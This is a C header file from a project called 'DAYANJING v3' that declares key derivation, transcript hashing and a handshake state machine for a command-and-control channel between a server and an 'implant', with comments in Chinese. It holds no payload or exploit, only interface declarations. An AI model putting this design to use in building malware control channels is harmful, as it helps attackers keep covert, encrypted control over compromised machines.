/*
 * DAYANJING v3 — c2.h
 *
 * C2 握手与会话密钥派生（C 实现）。
 *
 * 与 Python 侧 00_crypto/key_derivation.py 逐字节对齐，两端可对通：
 *   - 注册派生：PRK = Extract(salt=salt_reg, ikm=PSK)
 *               k_server_hold = Expand(PRK, "implant-pair:server:v1",   16)
 *               k_identity    = Expand(PRK, "implant-pair:identity:v1", 16)
 *   - 会话绑定上下文：ctx = PROTO_LABEL || generation(BE u64)
 *                          || server_static_id(16B) || implant_id(UTF-8)
 *   - 会话派生：session_prk = Extract(salt=transcript_hash, ikm=master)
 *               k_c2s     = Expand(PRK, "session:c2s:v1"     + ctx, 16)
 *               k_s2c     = Expand(PRK, "session:s2c:v1"     + ctx, 16)
 *               k_confirm = Expand(PRK, "session:confirm:v1" + ctx, 16)
 *   - transcript = SHA256(HELLO || WELCOME || finished_prefix)
 *
 * 安全约束：
 *   - 强制 k_c2s != k_s2c（单向密钥分离，禁止单密钥退化）
 *   - transcript 流式累积，覆盖完整握手消息，防握手篡改（降级/重放）
 */

#ifndef DAYANJING_C2_H
#define DAYANJING_C2_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ---- 常量 ---- */
#define C2_PSK_MIN_LEN      16   /* PSK 最少 16 字节（128 bit 熵） */
#define C2_SALT_REG_LEN     32   /* 注册盐长度 */
#define C2_KEY_LEN          16   /* AES-128 密钥长度 */
#define C2_TRANSCRIPT_LEN   32   /* SHA-256 输出长度 */
#define C2_SERVER_ID_LEN    16   /* 服务端静态身份长度 */
#define C2_IMPLANT_ID_MAX   64   /* implant_id 最大长度（含终止符） */

/* ---- 返回值 ---- */
#define C2_OK            0
#define C2_ERR_ARG      -1   /* 参数非法 */
#define C2_ERR_LEN      -2   /* 长度非法（缓冲区不足/长度不符） */
#define C2_ERR_STATE    -3   /* 非法状态转移 */
#define C2_ERR_COLLIDE  -4   /* 密钥碰撞：k_c2s == k_s2c */

/* ====================================================================
 * 密钥材料
 * ==================================================================== */

/* 注册期派生出的长期密钥对 */
typedef struct {
    uint8_t k_server_hold[C2_KEY_LEN];
    uint8_t k_identity[C2_KEY_LEN];
} c2_keymat_t;

/* 会话密钥三元组 */
typedef struct {
    uint8_t k_c2s[C2_KEY_LEN];      /* client -> server 方向 */
    uint8_t k_s2c[C2_KEY_LEN];      /* server -> client 方向 */
    uint8_t k_confirm[C2_KEY_LEN];  /* Finished 确认密钥 */
} c2_session_keys_t;

/*
 * 注册期派生。
 * psk_len 必须 >= C2_PSK_MIN_LEN，salt_reg 必须 32 字节。
 */
int c2_derive_pair(const uint8_t *psk, size_t psk_len,
                   const uint8_t salt_reg[C2_SALT_REG_LEN],
                   c2_keymat_t *km);

/*
 * 构造会话绑定上下文 ctx。
 * out 可为 NULL（仅探测长度）。返回 ctx 实际长度；缓冲区不足返回 C2_ERR_LEN。
 */
int c2_build_context(const uint8_t server_static_id[C2_SERVER_ID_LEN],
                     const char *implant_id,
                     uint64_t generation,
                     uint8_t *out, size_t cap, size_t *out_len);

/*
 * 会话密钥派生。transcript_hash 必须 32 字节，master 必须 16 字节。
 * 若 k_c2s == k_s2c 返回 C2_ERR_COLLIDE 且不输出密钥。
 */
int c2_derive_session(const uint8_t master[C2_KEY_LEN],
                      const uint8_t transcript_hash[C2_TRANSCRIPT_LEN],
                      const uint8_t server_static_id[C2_SERVER_ID_LEN],
                      const char *implant_id,
                      uint64_t generation,
                      c2_session_keys_t *sk);

/* ====================================================================
 * Transcript（流式 SHA-256，覆盖完整握手消息）
 * ==================================================================== */

typedef struct {
    void *opaque;   /* 内部为 sha256_ctx，避免暴露结构布局 */
} c2_transcript_t;

void c2_transcript_init(c2_transcript_t *t);
void c2_transcript_feed(c2_transcript_t *t, const uint8_t *data, size_t len);
void c2_transcript_final(c2_transcript_t *t, uint8_t out[C2_TRANSCRIPT_LEN]);
void c2_transcript_free(c2_transcript_t *t);

/* ====================================================================
 * 握手状态机
 * ==================================================================== */

typedef enum {
    C2_HS_INIT = 0,     /* 未开始 */
    C2_HS_HELLO,        /* 已处理 HELLO */
    C2_HS_WELCOME,      /* 已处理 WELCOME */
    C2_HS_FINISHED,     /* 已处理 FINISHED */
    C2_HS_ACTIVE,       /* 握手完成，进入应用数据阶段 */
    C2_HS_FAILED        /* 终态：任何错误后进入，不可再转移 */
} c2_hs_state_t;

typedef struct {
    c2_hs_state_t  state;
    c2_transcript_t tr;
} c2_handshake_t;

void c2_hs_init(c2_handshake_t *h);
void c2_hs_free(c2_handshake_t *h);

/* 判断转移是否合法（表驱动，单一事实源） */
int c2_hs_can(c2_hs_state_t cur, c2_hs_state_t next);

/*
 * 推进一步：校验转移合法性，并把 msg 累积进 transcript。
 * msg 可为 NULL（len=0），表示无可累积内容。
 * 非法转移返回 C2_ERR_STATE 且不改变状态、不污染 transcript。
 */
int c2_hs_step(c2_handshake_t *h, c2_hs_state_t next,
               const uint8_t *msg, size_t len);

/* 取当前 transcript（不终结，可继续 feed） */
int c2_hs_transcript(const c2_handshake_t *h, uint8_t out[C2_TRANSCRIPT_LEN]);

/* 状态名，便于日志/调试 */
const char *c2_hs_state_name(c2_hs_state_t s);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_C2_H */
